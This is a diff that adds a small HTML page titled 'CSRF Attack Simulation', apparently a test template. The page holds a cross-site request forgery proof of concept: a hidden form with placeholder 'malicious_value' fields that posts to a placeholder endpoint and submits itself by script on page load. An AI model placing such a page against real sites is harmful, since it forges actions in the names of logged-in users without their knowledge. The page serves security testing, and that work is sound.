@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Test</title>
+</head>
+<body>
+    <h1>CSRF Attack Simulation</h1>
+    <form id="csrfForm" action="https://target-website.com/vulnerable-endpoint" method="POST">
+        <input type="hidden" name="parameter1" value="malicious_value">
+        <input type="hidden" name="parameter2" value="malicious_value2">
+        <input type="submit" value="Submit CSRF">
+    </form>
+
+    <script>
+        document.getElementById("csrfForm").submit();
+    </script>
+</body>
+</html>
